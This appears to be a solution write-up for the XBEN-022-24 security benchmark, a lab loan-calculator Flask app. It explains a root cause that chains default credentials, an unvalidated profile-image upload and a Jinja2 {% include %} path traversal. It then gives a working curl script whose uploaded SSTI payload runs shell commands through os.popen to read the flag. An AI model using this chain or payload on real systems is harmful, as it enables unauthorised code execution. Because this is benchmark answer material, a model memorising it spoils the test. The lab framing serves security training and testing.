# XBEN-022-24 — Loan Calculator - Include

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Default credentials -> arbitrary file upload -> Server-Side Template Injection (SSTI) via a Jinja2 `{% include %}` path-traversal gadget in `/error`.

## Root cause

- `app/website/app/__init__.py` seeds a default user `test`/`test`.
- `/update_profile` lets an authenticated user upload a "profile image" with an attacker-controlled filename/extension into `app/static/images/<filename>` (only path-traversal *outside* `static/` is blocked; any extension, including `.html`, is accepted and the content is never validated as an image).
- `/error?error_type=...` builds `templates/<error_type>`, resolves it under `app/static/`, and (after a same-prefix check that only prevents escaping `static/`) renders `templates/error.html`, which contains `{% include error_type %}`. By supplying `error_type=../images/<filename>` the traversal is resolved *before* the prefix check but still points at our uploaded file inside `static/images/`, so Jinja includes and renders our uploaded HTML as a template — full SSTI / RCE.

## Exploit

```bash
PORT=<PORT>          # from docker compose port, e.g. 62168
BASE=http://localhost:$PORT
COOKIES=/tmp/xben022_cookies.txt

# 1. Log in with default creds test/test
curl -s -c $COOKIES -b $COOKIES -X POST $BASE/login -d "username=test&password=test" -i

# 2. Upload a malicious "profile image" that is actually a Jinja2 SSTI payload
cat > /tmp/evil.html << 'EOF'
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
EOF

curl -s -c $COOKIES -b $COOKIES -X POST $BASE/update_profile \
  -F "name=John" -F "lastname=Doe" -F "email=john@example.com" \
  -F "loan_amount=10000" -F "loan_term_months=60" -F "monthly_payment=212.47" \
  -F "image_profile=@/tmp/evil.html;filename=evil.html;type=text/html"

# 3. Trigger the vulnerable {% include %} in error.html, pointing at our uploaded file
curl -s -c $COOKIES -b $COOKIES "$BASE/error?message=test&error_type=../images/evil.html"
```
